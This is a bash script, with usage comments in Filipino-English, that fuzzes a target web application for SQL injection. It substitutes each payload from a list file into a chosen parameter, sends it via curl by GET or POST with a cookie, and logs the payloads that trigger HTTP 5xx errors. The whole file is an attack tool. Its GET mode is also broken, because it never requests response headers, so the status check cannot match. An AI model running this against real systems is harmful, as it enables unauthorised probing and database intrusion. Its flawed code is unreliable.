# !/usr/bin/bash
#
# Usage ./sqli_500.txt <target link> <payload list file> <data> <method get/post> <output file> <cookie>
# Note:
# 1) data - Set yung paremeter sa X para mafuzz. E.g. id=X, username=X&password=X, post=X. Kung hindi ifufuzz, lagyan lang ng kahit ano wag lang "X". E.g. username=X&password=password

URL=$1
filename=$2
data=$3
method=$4
output_file=$5
cookie=$6

count=0

while read line;
do
	to_send=$(echo -e "$line" ); 
	
	#Changing the data
	to_send=$(echo $data | sed "s/X/$(printf "%q" "$to_send")/g");

	echo $to_send;
	
	if [[ $method == *"post"* ]];
	then
		
		result=$(curl $URL --data "$to_send" --cookie "$cookie" -i | grep -P "HTTP/[1-3]\.[0-5] 5");
	else
		result=$(curl "$URL/?$to_send" --cookie "$cookie" | grep -P "HTTP/[1-3]\.[0-5] 5");
	fi

	echo $result;	

	if [ ${#result} -gt 1 ];
	then
		echo [+] - $to_send >> $output_file;
		echo "" - >> $output_file; 
		let count=$count+1;
	fi 
done < $filename

let total=$(cat $filename | wc -l);
echo "[*] $count out of "$total" worked" >> $output_file;



